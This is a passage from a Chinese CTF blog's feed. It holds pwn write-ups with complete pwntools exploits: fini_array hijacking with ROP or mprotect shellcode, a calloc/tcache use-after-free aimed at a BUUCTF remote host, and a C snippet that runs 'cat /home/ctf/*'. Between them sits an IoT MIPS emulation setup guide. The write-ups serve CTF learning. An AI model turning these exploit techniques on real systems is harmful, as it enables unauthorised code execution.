punctuation">]</span><span class="token operator">=</span><span class="token string">"cat /home/ctf/*"</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span>rce<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>一开始我是用oj0的exp的字节码输入的，但太长了，就换了个这个，不过也报错了，预期解是啥我不知道，这题最终解决还是非预期解，直接</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"/home/ctf/flag"</span></span></code></pre><p>即可</p><p>👴裂开来</p><p>以上就是我做出来的四道题，下面四道就是复现了</p><h2 id="0x5-Memory-Monster-II"><a href="#0x5-Memory-Monster-II" class="headerlink" title="0x5.Memory_Monster_II"></a>0x5.Memory_Monster_II</h2><p>这题静态编译，后门函数就是钓鱼(/bin/fish)，做的时候毫无头绪，遂谷歌一波，找到了这位师傅的<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/" target="_blank" rel="noopener">博客</a>,不过看到有栈迁移就没看了，因为这题有个canary检查嘛。。。赛后看师傅们的wp，发现这一篇博文记录的知识点和题目考察的知识点一样的，就是劫持fini_array，真想给自己来一大嘴巴子。。。。</p><p>由于程序是静态编译，所以函数名杂乱无章，不过IDA能够识别出start函数，start函数里面会调用__libc_start_main，函数原型如下</p><pre class=" language-c"><code class="language-c"><span class="token function">__libc_start_main</span><span class="token punctuation">(</span>main<span class="token punctuation">,</span>argc<span class="token punctuation">,</span>argv<span class="token operator">&amp;</span>env<span class="token punctuation">,</span>init<span class="token punctuation">,</span>fini<span class="token punctuation">,</span>rtld_fini<span class="token punctuation">)</span></code></pre><p>我们对照着看Memory_Monster_I和Memory_Monster_II的start函数</p><p><img src="/LawlietLW.github.io/2020/05/24/dasctf-wu-yue-sai-bjdctf/1.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/05/24/dasctf-wu-yue-sai-bjdctf/2.jpg" alt=""></p><p>很容易通过对比确定函数</p><p>然后我们还需要一切前置知识，Linux下c程序是如何运行的，大致流程如下</p><pre><code>_start---&gt;__libc_start_main_---&gt;init---&gt;main---&gt;fini</code></pre><p>init和fini中分别存在数组.init_array和.fini_arry，这两个数组中存储着init函数和fini函数要执行的函数地址，可以通过ctrl+s在IDA中查看这两个数组的地址</p><p><img src="/LawlietLW.github.io/2020/05/24/dasctf-wu-yue-sai-bjdctf/3.jpg" alt=""></p><p>我们在gdb中查看一下具体内容</p><p><img src="/LawlietLW.github.io/2020/05/24/dasctf-wu-yue-sai-bjdctf/4.jpg" alt=""></p><p>可以看到，.init_array和.fini_array中都存储着两个地址</p><p>上面的程序执行流程，更细化一点如下</p><pre><code>_start---&gt;__libc_start_main---&gt;init---&gt;.init_array[0]---&gt;.init_array[1]---&gt;...---&gt;.init_array[n]---&gt;main---&gt;fini---&gt;.fini_array[n]---&gt;.fini_array[n-1]---&gt;...---&gt;.fini_array[0]</code></pre><p>init函数为执行main函数做准备，fini函数为main函数收尾，且init的执行顺序是顺序执行，fini则是逆序执行</p><p>此题中.init_array和.fini_array都有两个值，所以当我们将.fini_array[1]修改为main函数的地址，将.fini_array[0]修改为fini函数的地址，就可以无限循环了，流程如下</p><pre><code>_start---&gt;__libc_start_main---&gt;init---&gt;.init_array[0]---&gt;.init_array[1]---&gt;main---&gt;fini---&gt;.fini_array[1](main)---&gt;.fini_array[0](fini)</code></pre><p>所以这题的思路就是，首先修改.fini_array[1]为main函数的地址，.fini_array[0]修改为fini函数的地址，然后往.fini_array[2]上写rop链，rop链构造好后，再将.fini_array[0]修改为leave_ret,.fini_array[1]修改为ret即可执行rop链，这里其实就是一个栈迁移，具体原因看上面那个链接</p><p>exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Memory_Monster_II'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'Memory_Monster_II'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'addr:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>target<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'data:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>fini_array <span class="token operator">=</span> <span class="token number">0x4b80b0</span>main <span class="token operator">=</span> <span class="token number">0x401c1d</span>fini <span class="token operator">=</span> <span class="token number">0x402cb0</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401746</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x0000000000406f80</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x0000000000448415</span>pop_rax_ret <span class="token operator">=</span> <span class="token number">0x0000000000448fcc</span>bin_sh_addr <span class="token operator">=</span> <span class="token number">0x0000000000492895</span>leave_ret <span class="token operator">=</span> <span class="token number">0x0000000000401cf3</span>syscall <span class="token operator">=</span> <span class="token number">0x0000000000402514</span>ret <span class="token operator">=</span> <span class="token number">0x0000000000401016</span>write<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fini_array<span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>fini<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fini_array<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fini_array<span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fini_array<span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fini_array<span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fini_array<span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fini_array<span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>呜呼呼，这题涨姿势了，学到了新知识点</p><h2 id="0x6-Memory-Monster-III"><a href="#0x6-Memory-Monster-III" class="headerlink" title="0x6.Memory Monster III"></a>0x6.Memory Monster III</h2><p>思路可上一题大致相同，不过要利用mprotect修改内存段权限，然后写入shellcode执行</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./Memory_Monster_III'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Memory_Monster_III'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'Memory_Monster_III'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'addr:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>target<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'data:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>fini_array <span class="token operator">=</span> <span class="token number">0x4b50b0</span>main <span class="token operator">=</span> <span class="token number">0x401c1d</span>fini <span class="token operator">=</span> <span class="token number">0x402ca0</span>mprotect <span class="token operator">=</span> <span class="token number">0x448420</span>buf <span class="token operator">=</span> <span class="token number">0x4bc100</span>read <span class="token operator">=</span> <span class="token number">0x447620</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401746</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x0000000000406f70</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x0000000000447635</span>leave_ret <span class="token operator">=</span> <span class="token number">0x0000000000401cf3</span>ret <span class="token operator">=</span> <span class="token number">0x0000000000401016</span>write<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fini_array<span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>fini<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fini_array<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fini_array<span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fini_array<span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fini_array<span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>read<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fini_array<span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>buf<span class="token number">-0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fini_array<span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fini_array<span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fini_array<span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fini_array<span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;菜鸡打比赛就是兴致满满打开网站—&amp;gt;下载附件，拖入IDA—&amp;gt;F5，眉头紧锁，冷静分析—&amp;gt;关闭网站，打开游戏，ctf什么的见鬼去吧&lt;/p&gt;
&lt;p&gt;这次安恒月赛和bjdctf3rd梦幻联动，本着凑热闹的心态去打了一波，总共八个pwn，做了四个。。。艹，太菜了，下面记录并复现一下这次的赛题&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://lawliet.ren/categories/CTF/"/>
    
    
      <category term="PWN" scheme="https://lawliet.ren/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>路由器环境搭建</title>
    <link href="https://lawliet.ren/2020/05/17/lu-you-qi-huan-jing-da-jian/"/>
    <id>https://lawliet.ren/2020/05/17/lu-you-qi-huan-jing-da-jian/</id>
    <published>2020-05-17T10:22:42.000Z</published>
    <updated>2020-09-23T11:52:28.902Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p>首先是安装<strong>binwalk</strong>，有两种方法</p><pre><code>方法1:sudo apt-get install binwalk 方法2:git clone https://github.com/attify/firmware-analysis-toolkit.git这个工具包里有binwalk和firmadyne和qemu三个工具，不过qemu建议自己编译安装，所以可以把setup.sh里面安装qemu的部分注释掉cd firmware-analysis-toolkitsudo ./setup.sh然后只需要等待即可，一键安装安装完binwalk后提取squashfs-root文件系统有时会出问题，需要安装sasquatchgit clone https://github.com/devttys0/sasquatch.gitcd sasquatch./build.sh</code></pre><p>至此，binwalk安装完毕</p><p>接下来是qemu，按照H4lo大佬的说法，过高版本或者过低版本在某些情况下会报错，如果是Ubuntu16，推荐<strong>qemu2.4.0</strong>版本，如果是Ubuntu18推荐<strong>qemu2.10.0</strong>下载压缩包本地编译</p><pre><code>wget https://download.qemu.org/qemu-2.4.0.tar.xztar xvf qemu-2.4.0.tar.xz &amp;&amp; cd qemu-2.4.0/./configuremake -j8sudo make install</code></pre><p>还安装一个<strong>qemu-user-static</strong>，因为qemu运行需要连接库，静态编译的qemu不需要库文件</p><pre><code>apt install qemu-user-static</code></pre><p><strong>交叉编译环境 buildroot安装</strong></p><p>还是跟着h牛的文章来，先把所有库都装上</p><pre><code>sudo apt-get install libncurs*wget http://buildroot.uclibc.org/downloads/snapshots/buildroot-snapshot.tar.bz2tar -jxvf buildroot-snapshot.tar.bz2cd buildroot/make cleanmake menuconfigsudo make</code></pre><p><strong>make menuconfig</strong>之后，会出现一个GUI界面，进入<strong>Target option</strong>，选择<strong>Target Architecture Varient</strong>为<strong>Mips 32</strong>，将<strong>Target Architecture</strong>选为<strong>MIPS(little endian)</strong>,保存后退出到上一级，进入<strong>Toolchain</strong>，将<strong>Kernel Headers</strong>修改为本机的kernel版本即可，然后保存退出，编译时间会有一个小时左右</p><p> <strong>gdb-multiarch</strong></p><pre><code>sudo apt-get install gdb-multiarch</code></pre><p>接下来我们还需要安装一下mips版本的gcc及其相关组件，apt 中对应的包名为 <code>gcc-mips-linux-gnu</code> 与 <code>gcc-mipsel-linux-gnu</code></p><pre><code>sudo apt-get install gcc-mips-linux-gnusudo apt-get install gcc-mipsel-linux-gnu</code></pre><p>相关的libc库都放在/usr目录下</p><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/7.jpg" alt=""></p><p>其中mips-linux-gnu-gcc用来编译大端序程序，mipsel-linux-gnu-gcc用来编译小端序</p><p>我们来写一个小程序验证一下</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> <span class="token operator">*</span>a<span class="token punctuation">;</span>        a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这是h牛的文章中的一个程序</p><p>首先我们用小端序编译</p><pre><code>mipsel-linux-gnu-gcc demo.c -o demo -static</code></pre><p>静态编译</p><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/1.jpg" alt=""></p><p>可以看出确实是小端序静态链接，接着我们运行一下</p><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/2.jpg" alt=""></p><p>运行没问题。我们再用大端序编译一下</p><pre><code>mips-linux-gnu-gcc demo.c -o demo -static</code></pre><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/3.jpg" alt=""></p><p>确实是大端序静态链接</p><p>接着运行</p><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/4.jpg" alt=""></p><p>无误</p><p>现在都是静态链接，我们再动态编译一下</p><pre><code>mipsel-linux-gnu-gcc demo.c -o demo</code></pre><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/5.jpg" alt=""></p><pre><code>qemu-mipsel -L /usr/mipsel-linux-gnu/ ./demo</code></pre><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/6.jpg" alt=""></p><p>-L是连接指定的libc库</p><p>如果还需要安装arm的环境，可以运行如下命令</p><pre><code>apt install gcc-arm-linux-gnueabihf</code></pre><p>这个工具用来编译arm程序</p><p>然后用</p><pre><code>apt-cache search "libc6" | grep arm</code></pre><p>找到arm的库</p><p><img src="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/8.jpg" alt=""></p><p>将这些库安装好即可</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;首先是安装&lt;strong&gt;binwalk&lt;/strong&gt;，有两种方法&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;方法1:sudo apt-get install binwalk 
方法2:
git clone https://github.com
      
    
    </summary>
    
    
      <category term="IOT" scheme="https://lawliet.ren/categories/IOT/"/>
    
    
      <category term="环境搭建" scheme="https://lawliet.ren/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF刷题记录</title>
    <link href="https://lawliet.ren/2020/05/08/buuctf-shua-ti-ji-lu/"/>
    <id>https://lawliet.ren/2020/05/08/buuctf-shua-ti-ji-lu/</id>
    <published>2020-05-08T10:56:40.000Z</published>
    <updated>2021-04-16T03:53:41.008Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-gyctf-2020-signin"><a href="#0x1-gyctf-2020-signin" class="headerlink" title="0x1.gyctf_2020_signin"></a>0x1.gyctf_2020_signin</h2><p>环境是2.27.这题的考点在于，<strong>calloc</strong>不会从tcache中取chunk，而是直接从fastbin中取，并且会将fastbin中剩余的chunk链入tcache</p><a id="more"></a><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/1.jpg" alt=""></p><p>程序的漏洞在于dele函数中，有uaf漏洞,同时还存在一个后门函数，先使用<strong>calloc</strong>分配一个chunk，如果<strong>ptr</strong>不为0，就可getshell</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/2.jpg" alt=""></p><p>exp如下:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleepcontext<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary<span class="token operator">=</span><span class="token string">'./gyctf_2020_signin'</span><span class="token comment" spellcheck="true">#io = process('./gyctf_2020_signin')</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25777</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'gyctf_2020_signin'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your choice?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your choice?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#sleep(0.1)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your choice?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your choice?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'6'</span><span class="token punctuation">)</span>ptr<span class="token operator">=</span><span class="token number">0x4040c0</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io,'b calloc')</span>getshell<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>即先将tcache填满，之后free一个chunk进入fastbin，接着从tcache申请一块，然后调用后门函数，触发calloc，将ptr处写入前一个tcache的地址即可getshell</p><h2 id="0x2-gyctf-2020-document"><a href="#0x2-gyctf-2020-document" class="headerlink" title="0x2.gyctf_2020_document"></a>0x2.gyctf_2020_document</h2><p>程序保护全开</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/4.jpg" 